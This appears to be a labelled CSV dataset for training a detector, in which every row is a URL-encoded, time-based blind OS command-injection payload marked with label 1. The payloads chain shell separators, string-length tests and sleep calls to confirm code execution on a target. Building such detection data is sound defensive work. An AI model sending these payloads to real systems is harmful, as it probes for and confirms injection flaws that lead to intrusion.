Sentence,Label
%0A str%3D%24%28echo TYPSKV%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2527,1
%0A str%3D%24%28echo TYPSKV%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2527,1
%0A str%3D%24%28echo TYPSKV%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2527,1
%0A str%3D%24%28echo TYPSKV%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2527,1
%0A str%3D%24%28echo TYPSKV%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2527,1
%0A str%3D%24%28echo TYPSKV%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2527,1
%0A str%3D%24%28echo TYPSKV%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2527,1
%0A str%3D%24%28echo TYPSKV%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2527,1
%0A str%3D%24%28echo TYPSKV%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2527,1
%3B str%3D%24%28echo VGHMVB%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2522,1
%3B str%3D%24%28echo VGHMVB%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2522,1
%3B str%3D%24%28echo VGHMVB%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2522,1
%3B str%3D%24%28echo VGHMVB%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2522,1
%3B str%3D%24%28echo VGHMVB%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2522,1
%3B str%3D%24%28echo VGHMVB%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2522,1
%3B str%3D%24%28echo VGHMVB%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2522,1
%3B str%3D%24%28echo VGHMVB%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2522,1
%3B str%3D%24%28echo VGHMVB%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2522,1
%7C %5B 1 -ne %24%28echo WIGALP %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2522,1
%7C %5B 2 -ne %24%28echo WIGALP %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2522,1
%7C %5B 3 -ne %24%28echo WIGALP %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2522,1
%7C %5B 4 -ne %24%28echo WIGALP %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2522,1
%7C %5B 5 -ne %24%28echo WIGALP %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2522,1
%7C %5B 6 -ne %24%28echo WIGALP %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2522,1
%7C %5B 7 -ne %24%28echo WIGALP %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2522,1
%7C %5B 8 -ne %24%28echo WIGALP %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2522,1
%7C %5B 9 -ne %24%28echo WIGALP %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2522,1
%26 sleep 0 %26%26 str%3D%24%28echo QHSDUY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2522,1
%26 sleep 0 %26%26 str%3D%24%28echo QHSDUY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2522,1
%26 sleep 0 %26%26 str%3D%24%28echo QHSDUY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2522,1
%26 sleep 0 %26%26 str%3D%24%28echo QHSDUY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2522,1
%26 sleep 0 %26%26 str%3D%24%28echo QHSDUY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2522,1
%26 sleep 0 %26%26 str%3D%24%28echo QHSDUY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2522,1
%26 sleep 0 %26%26 str%3D%24%28echo QHSDUY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2522,1
%26 sleep 0 %26%26 str%3D%24%28echo QHSDUY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2522,1
%26 sleep 0 %26%26 str%3D%24%28echo QHSDUY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2522,1
%0A str%3D%24%28echo JADKKF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2522,1
%0A str%3D%24%28echo JADKKF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2522,1
%0A str%3D%24%28echo JADKKF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2522,1
%0A str%3D%24%28echo JADKKF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2522,1
%0A str%3D%24%28echo JADKKF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2522,1
%0A str%3D%24%28echo JADKKF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2522,1
%0A str%3D%24%28echo JADKKF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2522,1
%0A str%3D%24%28echo JADKKF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2522,1
%0A str%3D%24%28echo JADKKF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2522,1
%3B str%3D%24%28echo UOMPHD%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %255C%255C,1
%3B str%3D%24%28echo UOMPHD%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %255C%255C,1
%3B str%3D%24%28echo UOMPHD%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %255C%255C,1
%3B str%3D%24%28echo UOMPHD%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %255C%255C,1
%3B str%3D%24%28echo UOMPHD%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %255C%255C,1
%3B str%3D%24%28echo UOMPHD%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %255C%255C,1
%3B str%3D%24%28echo UOMPHD%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %255C%255C,1
%3B str%3D%24%28echo UOMPHD%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %255C%255C,1
%3B str%3D%24%28echo UOMPHD%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %255C%255C,1
%7C %5B 1 -ne %24%28echo CXWPXJ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %255C%255C,1
%7C %5B 2 -ne %24%28echo CXWPXJ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %255C%255C,1
%7C %5B 3 -ne %24%28echo CXWPXJ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %255C%255C,1
%7C %5B 4 -ne %24%28echo CXWPXJ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %255C%255C,1
%7C %5B 5 -ne %24%28echo CXWPXJ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %255C%255C,1
%7C %5B 6 -ne %24%28echo CXWPXJ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %255C%255C,1
%7C %5B 7 -ne %24%28echo CXWPXJ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %255C%255C,1
%7C %5B 8 -ne %24%28echo CXWPXJ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %255C%255C,1
%7C %5B 9 -ne %24%28echo CXWPXJ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %255C%255C,1
%26 sleep 0 %26%26 str%3D%24%28echo YXUPUJ%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %255C%255C,1
%26 sleep 0 %26%26 str%3D%24%28echo YXUPUJ%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %255C%255C,1
%26 sleep 0 %26%26 str%3D%24%28echo YXUPUJ%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %255C%255C,1
%26 sleep 0 %26%26 str%3D%24%28echo YXUPUJ%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %255C%255C,1
%26 sleep 0 %26%26 str%3D%24%28echo YXUPUJ%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %255C%255C,1
%26 sleep 0 %26%26 str%3D%24%28echo YXUPUJ%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %255C%255C,1
%26 sleep 0 %26%26 str%3D%24%28echo YXUPUJ%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %255C%255C,1
%26 sleep 0 %26%26 str%3D%24%28echo YXUPUJ%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %255C%255C,1
%26 sleep 0 %26%26 str%3D%24%28echo YXUPUJ%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %255C%255C,1
%0A str%3D%24%28echo IHGKBJ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %255C%255C,1
%0A str%3D%24%28echo IHGKBJ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %255C%255C,1
%0A str%3D%24%28echo IHGKBJ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %255C%255C,1
%0A str%3D%24%28echo IHGKBJ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %255C%255C,1
%0A str%3D%24%28echo IHGKBJ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %255C%255C,1
%0A str%3D%24%28echo IHGKBJ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %255C%255C,1
%0A str%3D%24%28echo IHGKBJ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %255C%255C,1
%0A str%3D%24%28echo IHGKBJ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %255C%255C,1
%0A str%3D%24%28echo IHGKBJ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %255C%255C,1
%3B str%3D%24%28echo PGAQQT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %252F%252F,1
%3B str%3D%24%28echo PGAQQT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %252F%252F,1
%3B str%3D%24%28echo PGAQQT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %252F%252F,1
%3B str%3D%24%28echo PGAQQT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %252F%252F,1
%3B str%3D%24%28echo PGAQQT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %252F%252F,1
%3B str%3D%24%28echo PGAQQT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %252F%252F,1
%3B str%3D%24%28echo PGAQQT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %252F%252F,1
%3B str%3D%24%28echo PGAQQT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %252F%252F,1
%3B str%3D%24%28echo PGAQQT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %252F%252F,1
%7C %5B 1 -ne %24%28echo VAZLJC %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %252F%252F,1
%7C %5B 2 -ne %24%28echo VAZLJC %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %252F%252F,1
%7C %5B 3 -ne %24%28echo VAZLJC %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %252F%252F,1
%7C %5B 4 -ne %24%28echo VAZLJC %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %252F%252F,1
%7C %5B 5 -ne %24%28echo VAZLJC %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %252F%252F,1
%7C %5B 6 -ne %24%28echo VAZLJC %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %252F%252F,1
%7C %5B 7 -ne %24%28echo VAZLJC %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %252F%252F,1
%7C %5B 8 -ne %24%28echo VAZLJC %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %252F%252F,1
%7C %5B 9 -ne %24%28echo VAZLJC %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %252F%252F,1
%26 sleep 0 %26%26 str%3D%24%28echo MATZOK%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %252F%252F,1
%26 sleep 0 %26%26 str%3D%24%28echo MATZOK%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %252F%252F,1
%26 sleep 0 %26%26 str%3D%24%28echo MATZOK%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %252F%252F,1
%26 sleep 0 %26%26 str%3D%24%28echo MATZOK%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %252F%252F,1
%26 sleep 0 %26%26 str%3D%24%28echo MATZOK%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %252F%252F,1
%26 sleep 0 %26%26 str%3D%24%28echo MATZOK%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %252F%252F,1
%26 sleep 0 %26%26 str%3D%24%28echo MATZOK%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %252F%252F,1
%26 sleep 0 %26%26 str%3D%24%28echo MATZOK%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %252F%252F,1
%26 sleep 0 %26%26 str%3D%24%28echo MATZOK%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %252F%252F,1
%0A str%3D%24%28echo BGUGCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %252F%252F,1
%0A str%3D%24%28echo BGUGCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %252F%252F,1
%0A str%3D%24%28echo BGUGCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %252F%252F,1
%0A str%3D%24%28echo BGUGCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %252F%252F,1
%0A str%3D%24%28echo BGUGCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %252F%252F,1
%0A str%3D%24%28echo BGUGCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %252F%252F,1
%0A str%3D%24%28echo BGUGCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %252F%252F,1
%0A str%3D%24%28echo BGUGCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %252F%252F,1
%0A str%3D%24%28echo BGUGCF%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %252F%252F,1
%3B str%3D%24%28echo DRVINS%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2526,1
%3B str%3D%24%28echo DRVINS%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2526,1
%3B str%3D%24%28echo DRVINS%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2526,1
%3B str%3D%24%28echo DRVINS%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2526,1
%3B str%3D%24%28echo DRVINS%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2526,1
%3B str%3D%24%28echo DRVINS%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2526,1
%3B str%3D%24%28echo DRVINS%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2526,1
%3B str%3D%24%28echo DRVINS%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2526,1
%3B str%3D%24%28echo DRVINS%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2526,1
%7C %5B 1 -ne %24%28echo SKWMFK %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2526,1
%7C %5B 2 -ne %24%28echo SKWMFK %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2526,1
%7C %5B 3 -ne %24%28echo SKWMFK %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2526,1
%7C %5B 4 -ne %24%28echo SKWMFK %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2526,1
%7C %5B 5 -ne %24%28echo SKWMFK %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2526,1
%7C %5B 6 -ne %24%28echo SKWMFK %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2526,1
%7C %5B 7 -ne %24%28echo SKWMFK %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2526,1
%7C %5B 8 -ne %24%28echo SKWMFK %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2526,1
%7C %5B 9 -ne %24%28echo SKWMFK %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2526,1
%26 sleep 0 %26%26 str%3D%24%28echo FXPFKU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2526,1
%26 sleep 0 %26%26 str%3D%24%28echo FXPFKU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2526,1
%26 sleep 0 %26%26 str%3D%24%28echo FXPFKU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2526,1
%26 sleep 0 %26%26 str%3D%24%28echo FXPFKU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2526,1
%26 sleep 0 %26%26 str%3D%24%28echo FXPFKU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2526,1
%26 sleep 0 %26%26 str%3D%24%28echo FXPFKU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2526,1
%26 sleep 0 %26%26 str%3D%24%28echo FXPFKU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2526,1
%26 sleep 0 %26%26 str%3D%24%28echo FXPFKU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2526,1
%26 sleep 0 %26%26 str%3D%24%28echo FXPFKU%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2526,1
%0A str%3D%24%28echo QOFXCY%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2526,1
%0A str%3D%24%28echo QOFXCY%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2526,1
%0A str%3D%24%28echo QOFXCY%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2526,1
%0A str%3D%24%28echo QOFXCY%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2526,1
%0A str%3D%24%28echo QOFXCY%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2526,1
%0A str%3D%24%28echo QOFXCY%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %2526,1
